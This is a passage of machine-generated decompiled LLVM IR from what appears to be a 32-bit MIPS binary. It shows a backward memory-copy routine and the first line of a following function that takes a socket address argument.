  store i32 %v3_405948, i32* %a3.global-to-local, align 4
  br i1 %v1_405948, label %dec_label_pc_40594c, label %dec_label_pc_405a88

dec_label_pc_40594c:                              ; preds = %dec_label_pc_405940
  %v1_405950 = urem i32 %v3_405948, 8
  store i32 %v1_405950, i32* %t1.global-to-local, align 4
  store i32 %v0_405944.lcssa, i32* %a0.global-to-local, align 4
  store i32 %v3_405948, i32* %t0.global-to-local, align 4
  %v1_40596c = mul nuw nsw i32 %v1_405950, 4
  store i32 ptrtoint (i32* @global_var_409620.212 to i32), i32* %v1.global-to-local, align 4
  %v2_405974 = add i32 %v1_40596c, ptrtoint (i32* @global_var_409620.212 to i32)
  store i32 %v2_405974, i32* %v0.global-to-local, align 4
  %v1_405978 = inttoptr i32 %v2_405974 to i32*
  %v2_405978 = load i32, i32* %v1_405978, align 4
  %v1_405980 = load i32, i32* %gp.global-to-local, align 4
  %v2_405980 = add i32 %v1_405980, %v2_405978
  store i32 %v2_405980, i32* %v0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_405980)
  store i32 0, i32* %t1.global-to-local, align 4
  %v0_405994 = load i32, i32* %a1.global-to-local, align 4
  %v1_405994 = add i32 %v0_405994, -8
  store i32 %v1_405994, i32* %a0.global-to-local, align 4
  %v1_405998 = add i32 %v0_405994, -4
  %v2_405998 = inttoptr i32 %v1_405998 to i32*
  %v3_405998 = load i32, i32* %v2_405998, align 4
  store i32 %v3_405998, i32* %v0.global-to-local, align 4
  %v0_40599c = load i32, i32* %a3.global-to-local, align 4
  %v1_40599c = add i32 %v0_40599c, 6
  store i32 %v1_40599c, i32* %t0.global-to-local, align 4
  %v0_4059a4 = load i32, i32* %t2.global-to-local, align 4
  %v1_4059a4 = add i32 %v0_4059a4, -4
  store i32 %v1_4059a4, i32* %v1.global-to-local, align 4
  %v1_4059a8 = add i32 %v0_405994, -12
  store i32 %v1_4059a8, i32* %a0.global-to-local, align 4
  %v3_4059ac = load i32, i32* %v2_405998, align 4
  store i32 %v3_4059ac, i32* %t1.global-to-local, align 4
  %v1_4059b0 = add i32 %v0_40599c, 5
  store i32 %v1_4059b0, i32* %t0.global-to-local, align 4
  %v1_4059b8 = add i32 %v0_4059a4, -8
  store i32 %v1_4059b8, i32* %v1.global-to-local, align 4
  %v1_4059bc = add i32 %v0_405994, -16
  store i32 %v1_4059bc, i32* %a0.global-to-local, align 4
  %v3_4059c0 = load i32, i32* %v2_405998, align 4
  store i32 %v3_4059c0, i32* %v0.global-to-local, align 4
  %v1_4059c4 = add i32 %v0_40599c, 4
  store i32 %v1_4059c4, i32* %t0.global-to-local, align 4
  %v1_4059cc = add i32 %v0_4059a4, -12
  store i32 %v1_4059cc, i32* %v1.global-to-local, align 4
  %v1_4059d0 = add i32 %v0_405994, -20
  store i32 %v1_4059d0, i32* %a0.global-to-local, align 4
  %v3_4059d4 = load i32, i32* %v2_405998, align 4
  store i32 %v3_4059d4, i32* %t1.global-to-local, align 4
  %v1_4059d8 = add i32 %v0_40599c, 3
  store i32 %v1_4059d8, i32* %t0.global-to-local, align 4
  %v1_4059e0 = add i32 %v0_4059a4, -16
  store i32 %v1_4059e0, i32* %v1.global-to-local, align 4
  %v1_4059e4 = add i32 %v0_405994, -24
  store i32 %v1_4059e4, i32* %a0.global-to-local, align 4
  %v3_4059e8 = load i32, i32* %v2_405998, align 4
  store i32 %v3_4059e8, i32* %v0.global-to-local, align 4
  %v1_4059ec = add i32 %v0_40599c, 2
  store i32 %v1_4059ec, i32* %t0.global-to-local, align 4
  %v1_4059f4 = add i32 %v0_4059a4, -20
  store i32 %v1_4059f4, i32* %v1.global-to-local, align 4
  %v1_4059f8 = add i32 %v0_405994, -28
  store i32 %v1_4059f8, i32* %a0.global-to-local, align 4
  %v3_4059fc = load i32, i32* %v2_405998, align 4
  store i32 %v3_4059fc, i32* %t1.global-to-local, align 4
  %v1_405a00 = add i32 %v0_40599c, 1
  store i32 %v1_405a00, i32* %t0.global-to-local, align 4
  %v1_405a08 = add i32 %v0_4059a4, -24
  store i32 %v1_405a08, i32* %v1.global-to-local, align 4
  %v1_405a0c = add i32 %v0_405994, -32
  store i32 %v1_405a0c, i32* %a0.global-to-local, align 4
  %v3_405a10 = load i32, i32* %v2_405998, align 4
  store i32 %v3_405a10, i32* %v0.global-to-local, align 4
  %v1_405a18 = add i32 %v0_4059a4, -28
  store i32 %v1_405a18, i32* %v1.global-to-local, align 4
  %v1_405a1c = add i32 %v0_405994, -36
  store i32 %v1_405a1c, i32* %a0.global-to-local, align 4
  %v3_405a20 = load i32, i32* %v2_405998, align 4
  store i32 %v3_405a20, i32* %t1.global-to-local, align 4
  %v1_405a24 = add i32 %v0_40599c, -1
  store i32 %v1_405a24, i32* %t0.global-to-local, align 4
  %v1_405a28 = add i32 %v0_4059a4, -32
  store i32 %v1_405a28, i32* %v1.global-to-local, align 4
  %v2_405a2c = inttoptr i32 %v1_405994 to i32*
  %v3_405a2c = load i32, i32* %v2_405a2c, align 4
  store i32 %v3_405a2c, i32* %v0.global-to-local, align 4
  %v3_405a30 = inttoptr i32 %v1_4059a4 to i32*
  store i32 %v3_405a20, i32* %v3_405a30, align 4
  %v0_405a34 = load i32, i32* %a0.global-to-local, align 4
  %v1_405a34 = add i32 %v0_405a34, 24
  %v2_405a34 = inttoptr i32 %v1_405a34 to i32*
  %v3_405a34 = load i32, i32* %v2_405a34, align 4
  store i32 %v3_405a34, i32* %t1.global-to-local, align 4
  %v0_405a38 = load i32, i32* %v0.global-to-local, align 4
  %v1_405a38 = load i32, i32* %v1.global-to-local, align 4
  %v2_405a38 = add i32 %v1_405a38, 24
  %v3_405a38 = inttoptr i32 %v2_405a38 to i32*
  store i32 %v0_405a38, i32* %v3_405a38, align 4
  %v0_405a3c = load i32, i32* %a0.global-to-local, align 4
  %v1_405a3c = add i32 %v0_405a3c, 20
  %v2_405a3c = inttoptr i32 %v1_405a3c to i32*
  %v3_405a3c = load i32, i32* %v2_405a3c, align 4
  store i32 %v3_405a3c, i32* %v0.global-to-local, align 4
  %v0_405a40 = load i32, i32* %t1.global-to-local, align 4
  %v1_405a40 = load i32, i32* %v1.global-to-local, align 4
  %v2_405a40 = add i32 %v1_405a40, 20
  %v3_405a40 = inttoptr i32 %v2_405a40 to i32*
  store i32 %v0_405a40, i32* %v3_405a40, align 4
  %v0_405a44 = load i32, i32* %a0.global-to-local, align 4
  %v1_405a44 = add i32 %v0_405a44, 16
  %v2_405a44 = inttoptr i32 %v1_405a44 to i32*
  %v3_405a44 = load i32, i32* %v2_405a44, align 4
  store i32 %v3_405a44, i32* %t1.global-to-local, align 4
  %v0_405a48 = load i32, i32* %v0.global-to-local, align 4
  %v1_405a48 = load i32, i32* %v1.global-to-local, align 4
  %v2_405a48 = add i32 %v1_405a48, 16
  %v3_405a48 = inttoptr i32 %v2_405a48 to i32*
  store i32 %v0_405a48, i32* %v3_405a48, align 4
  %v0_405a4c = load i32, i32* %a0.global-to-local, align 4
  %v1_405a4c = add i32 %v0_405a4c, 12
  %v2_405a4c = inttoptr i32 %v1_405a4c to i32*
  %v3_405a4c = load i32, i32* %v2_405a4c, align 4
  store i32 %v3_405a4c, i32* %v0.global-to-local, align 4
  %v0_405a50 = load i32, i32* %t1.global-to-local, align 4
  %v1_405a50 = load i32, i32* %v1.global-to-local, align 4
  %v2_405a50 = add i32 %v1_405a50, 12
  %v3_405a50 = inttoptr i32 %v2_405a50 to i32*
  store i32 %v0_405a50, i32* %v3_405a50, align 4
  %v0_405a54 = load i32, i32* %a0.global-to-local, align 4
  %v1_405a54 = add i32 %v0_405a54, 8
  %v2_405a54 = inttoptr i32 %v1_405a54 to i32*
  %v3_405a54 = load i32, i32* %v2_405a54, align 4
  store i32 %v3_405a54, i32* %t1.global-to-local, align 4
  %v0_405a58 = load i32, i32* %v0.global-to-local, align 4
  %v1_405a58 = load i32, i32* %v1.global-to-local, align 4
  %v2_405a58 = add i32 %v1_405a58, 8
  %v3_405a58 = inttoptr i32 %v2_405a58 to i32*
  store i32 %v0_405a58, i32* %v3_405a58, align 4
  %v0_405a5c = load i32, i32* %a0.global-to-local, align 4
  %v1_405a5c = add i32 %v0_405a5c, 4
  %v2_405a5c = inttoptr i32 %v1_405a5c to i32*
  %v3_405a5c = load i32, i32* %v2_405a5c, align 4
  store i32 %v3_405a5c, i32* %v0.global-to-local, align 4
  %v0_405a60 = load i32, i32* %t1.global-to-local, align 4
  %v1_405a60 = load i32, i32* %v1.global-to-local, align 4
  %v2_405a60 = add i32 %v1_405a60, 4
  %v3_405a60 = inttoptr i32 %v2_405a60 to i32*
  store i32 %v0_405a60, i32* %v3_405a60, align 4
  %v0_405a64 = load i32, i32* %t0.global-to-local, align 4
  %v1_405a64 = add i32 %v0_405a64, -8
  store i32 %v1_405a64, i32* %t0.global-to-local, align 4
  %v0_405a68 = load i32, i32* %a0.global-to-local, align 4
  %v1_405a68 = inttoptr i32 %v0_405a68 to i32*
  %v2_405a68 = load i32, i32* %v1_405a68, align 4
  store i32 %v2_405a68, i32* %t1.global-to-local, align 4
  %v0_405a6c = load i32, i32* %v0.global-to-local, align 4
  %v1_405a6c = load i32, i32* %v1.global-to-local, align 4
  %v2_405a6c = inttoptr i32 %v1_405a6c to i32*
  store i32 %v0_405a6c, i32* %v2_405a6c, align 4
  %v0_405a70 = load i32, i32* %t0.global-to-local, align 4
  %v1_405a70 = icmp eq i32 %v0_405a70, 0
  %v2_405a70 = load i32, i32* %v1.global-to-local, align 4
  %v3_405a70 = add i32 %v2_405a70, -32
  store i32 %v3_405a70, i32* %v1.global-to-local, align 4
  br i1 %v1_405a70, label %dec_label_pc_405a80, label %dec_label_pc_405a74

dec_label_pc_405a74:                              ; preds = %dec_label_pc_40594c
  %v0_405a7c = load i32, i32* %a0.global-to-local, align 4
  %v1_405a7c = add i32 %v0_405a7c, -32
  store i32 %v1_405a7c, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_405a80

dec_label_pc_405a80:                              ; preds = %dec_label_pc_40594c, %dec_label_pc_405a74
  %v0_405a84 = load i32, i32* %t1.global-to-local, align 4
  %v2_405a84 = add i32 %v2_405a70, -4
  %v3_405a84 = inttoptr i32 %v2_405a84 to i32*
  store i32 %v0_405a84, i32* %v3_405a84, align 4
  %v0_405a88.pre = load i32, i32* %v0.global-to-local, align 4
  %v0_405a90.pre = load i32, i32* %a1.global-to-local, align 4
  %v0_405a98.pre = load i32, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_405a88

dec_label_pc_405a88:                              ; preds = %dec_label_pc_405940, %dec_label_pc_405a80
  %v0_405ae4 = phi i32 [ %v3_405948, %dec_label_pc_405940 ], [ %v0_405a98.pre, %dec_label_pc_405a80 ]
  %v0_405a90 = phi i32 [ %v0_405944.lcssa, %dec_label_pc_405940 ], [ %v0_405a90.pre, %dec_label_pc_405a80 ]
  %v0_405a88 = phi i32 [ %v1_405944, %dec_label_pc_405940 ], [ %v0_405a88.pre, %dec_label_pc_405a80 ]
  %v1_405a88 = mul i32 %v0_405a88, 8
  store i32 %v1_405a88, i32* %t4.global-to-local, align 4
  %v2_405a90 = and i32 %v0_405a90, -4
  store i32 %v2_405a90, i32* %t0.global-to-local, align 4
  %v1_405a98 = urem i32 %v0_405ae4, 4
  store i32 %v1_405a98, i32* %v1.global-to-local, align 4
  %v2_405a9c = sub i32 32, %v1_405a88
  store i32 %v2_405a9c, i32* %t5.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  store i32 %v0_405ae4, i32* %t3.global-to-local, align 4
  %v1_405aa8 = add i32 %v2_405a90, 4
  store i32 %v1_405aa8, i32* %a0.global-to-local, align 4
  %v2_405aac = icmp eq i32 %v1_405a98, 1
  %v3_405aac = load i32, i32* %t2.global-to-local, align 4
  store i32 %v3_405aac, i32* %a3.global-to-local, align 4
  br i1 %v2_405aac, label %dec_label_pc_405b1c, label %dec_label_pc_405ab0

dec_label_pc_405ab0:                              ; preds = %dec_label_pc_405a88
  %v1_405ab4 = icmp eq i32 %v1_405a98, 0
  store i32 2, i32* %v0.global-to-local, align 4
  br i1 %v1_405ab4, label %dec_label_pc_405b08, label %dec_label_pc_405ab8

dec_label_pc_405ab8:                              ; preds = %dec_label_pc_405ab0
  store i32 3, i32* %v0.global-to-local, align 4
  %trunc = trunc i32 %v0_405ae4 to i2
  switch i2 %trunc, label %dec_label_pc_405ac8 [
    i2 -2, label %dec_label_pc_405ad8
    i2 -1, label %dec_label_pc_405af0
  ]

dec_label_pc_405ac8:                              ; preds = %dec_label_pc_405ab8
  store i32 0, i32* %t1.global-to-local, align 4
  store i32 0, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_405ad8

dec_label_pc_405ad8:                              ; preds = %dec_label_pc_405ab8, %dec_label_pc_405ac8
  %v0_405ad8 = phi i32 [ %v2_405a90, %dec_label_pc_405ab8 ], [ 0, %dec_label_pc_405ac8 ]
  %v1_405ad8 = add i32 %v0_405ad8, -8
  store i32 %v1_405ad8, i32* %a0.global-to-local, align 4
  %v2_405adc = inttoptr i32 %v0_405ad8 to i32*
  %v3_405adc = load i32, i32* %v2_405adc, align 4
  store i32 %v3_405adc, i32* %t1.global-to-local, align 4
  %v1_405ae0 = add i32 %v0_405ad8, -4
  %v2_405ae0 = inttoptr i32 %v1_405ae0 to i32*
  %v3_405ae0 = load i32, i32* %v2_405ae0, align 4
  store i32 %v3_405ae0, i32* %t0.global-to-local, align 4
  %v1_405ae4 = add i32 %v0_405ae4, 2
  store i32 %v1_405ae4, i32* %t3.global-to-local, align 4
  %v1_405aec = add i32 %v3_405aac, -4
  store i32 %v1_405aec, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_405af0

dec_label_pc_405af0:                              ; preds = %dec_label_pc_405ab8, %dec_label_pc_405ad8
  %v0_405afc = phi i32 [ %v1_405ae4, %dec_label_pc_405ad8 ], [ %v0_405ae4, %dec_label_pc_405ab8 ]
  %v0_405af0 = phi i32 [ %v3_405ae0, %dec_label_pc_405ad8 ], [ %v2_405a90, %dec_label_pc_405ab8 ]
  %v1_405af0 = add i32 %v0_405af0, -12
  store i32 %v1_405af0, i32* %a0.global-to-local, align 4
  %v2_405af4 = inttoptr i32 %v0_405af0 to i32*
  %v3_405af4 = load i32, i32* %v2_405af4, align 4
  store i32 %v3_405af4, i32* %t0.global-to-local, align 4
  %v1_405af8 = add i32 %v0_405af0, -4
  %v2_405af8 = inttoptr i32 %v1_405af8 to i32*
  %v3_405af8 = load i32, i32* %v2_405af8, align 4
  store i32 %v3_405af8, i32* %t1.global-to-local, align 4
  %v1_405afc = add i32 %v0_405afc, 1
  store i32 %v1_405afc, i32* %t3.global-to-local, align 4
  %v1_405b04 = add i32 %v3_405aac, -8
  store i32 %v1_405b04, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_405b08

dec_label_pc_405b08:                              ; preds = %dec_label_pc_405ab0, %dec_label_pc_405af0
  %v0_405b2811 = phi i32 [ %v0_405ae4, %dec_label_pc_405ab0 ], [ %v1_405afc, %dec_label_pc_405af0 ]
  %v0_405b08 = phi i32 [ %v2_405a90, %dec_label_pc_405ab0 ], [ %v3_405af4, %dec_label_pc_405af0 ]
  %v1_405b08 = add i32 %v0_405b08, -16
  store i32 %v1_405b08, i32* %a0.global-to-local, align 4
  %v2_405b0c = inttoptr i32 %v0_405b08 to i32*
  %v3_405b0c = load i32, i32* %v2_405b0c, align 4
  store i32 %v3_405b0c, i32* %t1.global-to-local, align 4
  %v1_405b10 = add i32 %v0_405b08, -4
  %v2_405b10 = inttoptr i32 %v1_405b10 to i32*
  %v3_405b10 = load i32, i32* %v2_405b10, align 4
  store i32 %v3_405b10, i32* %t0.global-to-local, align 4
  %v1_405b18 = add i32 %v3_405aac, -12
  store i32 %v1_405b18, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_405b1c

dec_label_pc_405b1c:                              ; preds = %dec_label_pc_405a88, %dec_label_pc_405b08
  %v0_405b28 = phi i32 [ %v0_405ae4, %dec_label_pc_405a88 ], [ %v0_405b2811, %dec_label_pc_405b08 ]
  %v0_405b1c = phi i32 [ %v2_405a90, %dec_label_pc_405a88 ], [ %v3_405b10, %dec_label_pc_405b08 ]
  %v1_405b1c = add i32 %v0_405b1c, -20
  store i32 %v1_405b1c, i32* %a0.global-to-local, align 4
  %v2_405b20 = inttoptr i32 %v0_405b1c to i32*
  %v3_405b20 = load i32, i32* %v2_405b20, align 4
  store i32 %v3_405b20, i32* %t0.global-to-local, align 4
  %v1_405b24 = add i32 %v0_405b1c, -4
  %v2_405b24 = inttoptr i32 %v1_405b24 to i32*
  %v3_405b24 = load i32, i32* %v2_405b24, align 4
  store i32 %v3_405b24, i32* %t1.global-to-local, align 4
  %v1_405b28 = add i32 %v0_405b28, -1
  store i32 %v1_405b28, i32* %t3.global-to-local, align 4
  %v1_405b2c = add i32 %v3_405aac, -16
  store i32 %v1_405b2c, i32* %a3.global-to-local, align 4
  %v2_405b30 = shl i32 %v3_405b20, %v2_405a9c
  store i32 %v2_405b30, i32* %v1.global-to-local, align 4
  %v2_405b34 = lshr i32 %v3_405b24, %v1_405a88
  %v2_405b38 = or i32 %v2_405b34, %v2_405b30
  store i32 %v2_405b38, i32* %v0.global-to-local, align 4
  %v1_405b3c = add i32 %v0_405b1c, -8
  %v2_405b3c = inttoptr i32 %v1_405b3c to i32*
  %v3_405b3c = load i32, i32* %v2_405b3c, align 4
  store i32 %v3_405b3c, i32* %t0.global-to-local, align 4
  %v2_405b40 = add i32 %v3_405aac, -4
  %v3_405b40 = inttoptr i32 %v2_405b40 to i32*
  store i32 %v2_405b38, i32* %v3_405b40, align 4
  %v0_405b44 = load i32, i32* %t1.global-to-local, align 4
  %v1_405b44 = load i32, i32* %t5.global-to-local, align 4
  %v2_405b44 = shl i32 %v0_405b44, %v1_405b44
  store i32 %v2_405b44, i32* %v1.global-to-local, align 4
  %v0_405b48 = load i32, i32* %t0.global-to-local, align 4
  %v1_405b48 = load i32, i32* %t4.global-to-local, align 4
  %v2_405b48 = lshr i32 %v0_405b48, %v1_405b48
  %v2_405b4c = or i32 %v2_405b48, %v2_405b44
  store i32 %v2_405b4c, i32* %v0.global-to-local, align 4
  %v0_405b50 = load i32, i32* %a0.global-to-local, align 4
  %v1_405b50 = add i32 %v0_405b50, 8
  %v2_405b50 = inttoptr i32 %v1_405b50 to i32*
  %v3_405b50 = load i32, i32* %v2_405b50, align 4
  store i32 %v3_405b50, i32* %t1.global-to-local, align 4
  %v1_405b54 = load i32, i32* %a3.global-to-local, align 4
  %v2_405b54 = add i32 %v1_405b54, 8
  %v3_405b54 = inttoptr i32 %v2_405b54 to i32*
  store i32 %v2_405b4c, i32* %v3_405b54, align 4
  %v0_405b58 = load i32, i32* %t0.global-to-local, align 4
  %v1_405b58 = load i32, i32* %t5.global-to-local, align 4
  %v2_405b58 = shl i32 %v0_405b58, %v1_405b58
  store i32 %v2_405b58, i32* %v1.global-to-local, align 4
  %v0_405b5c = load i32, i32* %t1.global-to-local, align 4
  %v1_405b5c = load i32, i32* %t4.global-to-local, align 4
  %v2_405b5c = lshr i32 %v0_405b5c, %v1_405b5c
  %v2_405b60 = or i32 %v2_405b5c, %v2_405b58
  store i32 %v2_405b60, i32* %v0.global-to-local, align 4
  %v0_405b64 = load i32, i32* %a0.global-to-local, align 4
  %v1_405b64 = add i32 %v0_405b64, 4
  %v2_405b64 = inttoptr i32 %v1_405b64 to i32*
  %v3_405b64 = load i32, i32* %v2_405b64, align 4
  store i32 %v3_405b64, i32* %t0.global-to-local, align 4
  %v1_405b68 = load i32, i32* %a3.global-to-local, align 4
  %v2_405b68 = add i32 %v1_405b68, 4
  %v3_405b68 = inttoptr i32 %v2_405b68 to i32*
  store i32 %v2_405b60, i32* %v3_405b68, align 4
  %v0_405b6c = load i32, i32* %t1.global-to-local, align 4
  %v1_405b6c = load i32, i32* %t5.global-to-local, align 4
  %v2_405b6c = shl i32 %v0_405b6c, %v1_405b6c
  store i32 %v2_405b6c, i32* %v1.global-to-local, align 4
  %v0_405b70 = load i32, i32* %t0.global-to-local, align 4
  %v1_405b70 = load i32, i32* %t4.global-to-local, align 4
  %v2_405b70 = lshr i32 %v0_405b70, %v1_405b70
  %v2_405b74 = or i32 %v2_405b70, %v2_405b6c
  store i32 %v2_405b74, i32* %v0.global-to-local, align 4
  %v0_405b78 = load i32, i32* %t3.global-to-local, align 4
  %v1_405b78 = add i32 %v0_405b78, -4
  store i32 %v1_405b78, i32* %t3.global-to-local, align 4
  %v0_405b7c = load i32, i32* %a0.global-to-local, align 4
  %v1_405b7c = inttoptr i32 %v0_405b7c to i32*
  %v2_405b7c = load i32, i32* %v1_405b7c, align 4
  store i32 %v2_405b7c, i32* %t1.global-to-local, align 4
  %v1_405b80 = load i32, i32* %a3.global-to-local, align 4
  %v2_405b80 = inttoptr i32 %v1_405b80 to i32*
  store i32 %v2_405b74, i32* %v2_405b80, align 4
  %v0_405b84 = load i32, i32* %t3.global-to-local, align 4
  %v1_405b84 = icmp eq i32 %v0_405b84, 0
  %v2_405b84 = load i32, i32* %a3.global-to-local, align 4
  %v3_405b84 = add i32 %v2_405b84, -16
  store i32 %v3_405b84, i32* @a3, align 4
  br i1 %v1_405b84, label %dec_label_pc_405b94, label %dec_label_pc_405b88

dec_label_pc_405b88:                              ; preds = %dec_label_pc_405b1c
  %v0_405b90 = load i32, i32* %a0.global-to-local, align 4
  %v1_405b90 = add i32 %v0_405b90, -16
  store i32 %v1_405b90, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_405b94

dec_label_pc_405b94:                              ; preds = %dec_label_pc_405b1c, %dec_label_pc_405b88
  %v0_405b94 = load i32, i32* %t1.global-to-local, align 4
  %v1_405b94 = load i32, i32* %t4.global-to-local, align 4
  %v2_405b94 = lshr i32 %v0_405b94, %v1_405b94
  %v0_405b98 = load i32, i32* %t0.global-to-local, align 4
  %v1_405b98 = load i32, i32* %t5.global-to-local, align 4
  %v2_405b98 = shl i32 %v0_405b98, %v1_405b98
  %v2_405b9c = or i32 %v2_405b98, %v2_405b94
  %v2_405ba0 = add i32 %v2_405b84, -4
  %v3_405ba0 = inttoptr i32 %v2_405ba0 to i32*
  store i32 %v2_405b9c, i32* %v3_405ba0, align 4
  %v0_405ba8 = load i32, i32* %a2.global-to-local, align 4
  %v2_405ba8 = and i32 %v0_405ba8, -4
  store i32 %v2_405ba8, i32* %v0.global-to-local, align 4
  %v0_405bac = load i32, i32* %t2.global-to-local, align 4
  %v2_405bac = sub i32 %v0_405bac, %v2_405ba8
  store i32 %v2_405bac, i32* %t2.global-to-local, align 4
  %v0_405bb0 = load i32, i32* %a1.global-to-local, align 4
  %v2_405bb0 = sub i32 %v0_405bb0, %v2_405ba8
  store i32 %v2_405bb0, i32* %a1.global-to-local, align 4
  %v1_405bb4 = urem i32 %v0_405ba8, 4
  store i32 %v1_405bb4, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_405bb8

dec_label_pc_405bb8:                              ; preds = %dec_label_pc_40590c.dec_label_pc_405bb8_crit_edge, %dec_label_pc_405b94
  %v0_405bc417 = phi i32 [ %v4_405914, %dec_label_pc_40590c.dec_label_pc_405bb8_crit_edge ], [ %v2_405bac, %dec_label_pc_405b94 ]
  %v0_405bc014 = phi i32 [ %v2_405910, %dec_label_pc_40590c.dec_label_pc_405bb8_crit_edge ], [ %v2_405bb0, %dec_label_pc_405b94 ]
  %v0_405bbc = phi i32 [ %v0_405bbc.pre, %dec_label_pc_40590c.dec_label_pc_405bb8_crit_edge ], [ %v1_405bb4, %dec_label_pc_405b94 ]
  store i32 %v0_405bbc, i32* %a2.global-to-local, align 4
  %v1_405bc022 = inttoptr i32 %v0_405bc014 to i8*
  %v2_405bc023 = load i8, i8* %v1_405bc022, align 1
  %v3_405bc024 = zext i8 %v2_405bc023 to i32
  store i32 %v3_405bc024, i32* %v0.global-to-local, align 4
  %v1_405bc425 = add i32 %v0_405bc417, -1
  store i32 %v1_405bc425, i32* %t2.global-to-local, align 4
  %v3_405bc826 = inttoptr i32 %v1_405bc425 to i8*
  store i8 %v2_405bc023, i8* %v3_405bc826, align 1
  %v0_405bcc27 = load i32, i32* %a2.global-to-local, align 4
  %v1_405bcc28 = add i32 %v0_405bcc27, -1
  store i32 %v1_405bcc28, i32* %a2.global-to-local, align 4
  %v1_405bd029 = icmp eq i32 %v1_405bcc28, 0
  %v2_405bd030 = load i32, i32* %a1.global-to-local, align 4
  %v3_405bd031 = add i32 %v2_405bd030, -1
  store i32 %v3_405bd031, i32* %a1.global-to-local, align 4
  br i1 %v1_405bd029, label %dec_label_pc_405bd4, label %dec_label_pc_405bc0.dec_label_pc_405bc0_crit_edge

dec_label_pc_405bc0.dec_label_pc_405bc0_crit_edge: ; preds = %dec_label_pc_405bb8, %dec_label_pc_405bc0.dec_label_pc_405bc0_crit_edge
  %v3_405bd032 = phi i32 [ %v3_405bd0, %dec_label_pc_405bc0.dec_label_pc_405bc0_crit_edge ], [ %v3_405bd031, %dec_label_pc_405bb8 ]
  %v0_405bc4.pre = load i32, i32* %t2.global-to-local, align 4
  %v1_405bc0 = inttoptr i32 %v3_405bd032 to i8*
  %v2_405bc0 = load i8, i8* %v1_405bc0, align 1
  %v3_405bc0 = zext i8 %v2_405bc0 to i32
  store i32 %v3_405bc0, i32* %v0.global-to-local, align 4
  %v1_405bc4 = add i32 %v0_405bc4.pre, -1
  store i32 %v1_405bc4, i32* %t2.global-to-local, align 4
  %v3_405bc8 = inttoptr i32 %v1_405bc4 to i8*
  store i8 %v2_405bc0, i8* %v3_405bc8, align 1
  %v0_405bcc = load i32, i32* %a2.global-to-local, align 4
  %v1_405bcc = add i32 %v0_405bcc, -1
  store i32 %v1_405bcc, i32* %a2.global-to-local, align 4
  %v1_405bd0 = icmp eq i32 %v1_405bcc, 0
  %v2_405bd0 = load i32, i32* %a1.global-to-local, align 4
  %v3_405bd0 = add i32 %v2_405bd0, -1
  store i32 %v3_405bd0, i32* %a1.global-to-local, align 4
  br i1 %v1_405bd0, label %dec_label_pc_405bd4, label %dec_label_pc_405bc0.dec_label_pc_405bc0_crit_edge

dec_label_pc_405bd4:                              ; preds = %dec_label_pc_405bc0.dec_label_pc_405bc0_crit_edge, %dec_label_pc_405bb8
  %v2_405bd0.lcssa = phi i32 [ %v2_405bd030, %dec_label_pc_405bb8 ], [ %v2_405bd0, %dec_label_pc_405bc0.dec_label_pc_405bc0_crit_edge ]
  store i32 %v2_405bd0.lcssa, i32* %a1.global-to-local, align 4
  %v0_405bdc = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_405bdc, i32* %v0.global-to-local, align 4
  ret i32 %v0_405bdc

; uselistorder directives
  uselistorder i32 %v3_405bd0, { 1, 0 }
  uselistorder i32 %v1_405bb4, { 1, 0 }
  uselistorder i32 %v0_405b1c, { 0, 3, 2, 1 }
  uselistorder i32 %v0_405b08, { 2, 1, 0 }
  uselistorder i32 %v0_405af0, { 2, 1, 0 }
  uselistorder i32 %v0_405ad8, { 2, 1, 0 }
  uselistorder i32 %v1_405a98, { 2, 1, 0 }
  uselistorder i32 %v2_405a90, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_405a88, { 2, 1, 0 }
  uselistorder i32 %v0_405ae4, { 4, 3, 2, 5, 1, 6, 0 }
  uselistorder i32 %v3_405948, { 3, 2, 0, 1 }
  uselistorder i32 %v1_405944, { 2, 1, 0 }
  uselistorder i32 %v0_405944.lcssa, { 2, 1, 0 }
  uselistorder i32 %v1_40591c, { 2, 1, 0 }
  uselistorder i32 %v4_405914, { 2, 1, 0, 3 }
  uselistorder i32 %v2_405910, { 1, 0, 2 }
  uselistorder i32* %v1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 14, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 29, 30, 25, 26, 27, 28 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 31, 2, 3, 4, 5, 6, 7, 9, 8, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 32, 27, 28, 29, 30 }
  uselistorder i32* %t2.global-to-local, { 0, 4, 5, 1, 6, 7, 8, 2, 9, 10, 3 }
  uselistorder i32* %gp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %a3.global-to-local, { 3, 0, 2, 1, 4, 7, 5, 6, 8, 10, 9, 11 }
  uselistorder i32* %a2.global-to-local, { 0, 6, 7, 1, 2, 3, 4, 5 }
  uselistorder i32* %a1.global-to-local, { 0, 2, 7, 8, 5, 1, 9, 11, 10, 3, 4, 12, 13, 6 }
  uselistorder i32 5, { 5, 2, 0, 3, 6, 7, 8, 9, 4, 1 }
  uselistorder i32 %arg3, { 2, 0, 1, 5, 4, 3, 6 }
  uselistorder label %dec_label_pc_405bc0.dec_label_pc_405bc0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_405bb8, { 1, 0 }
  uselistorder label %dec_label_pc_405b94, { 1, 0 }
  uselistorder label %dec_label_pc_405b1c, { 1, 0 }
  uselistorder label %dec_label_pc_405b08, { 1, 0 }
  uselistorder label %dec_label_pc_405af0, { 1, 0 }
  uselistorder label %dec_label_pc_405ad8, { 1, 0 }
  uselistorder label %dec_label_pc_405a88, { 1, 0 }
  uselistorder label %dec_label_pc_405a80, { 1, 0 }
  uselistorder label %dec_label_pc_40592c.dec_label_pc_40592c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_40590c, { 1, 0 }
}

define i32 @function_405bf0(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405bf0:
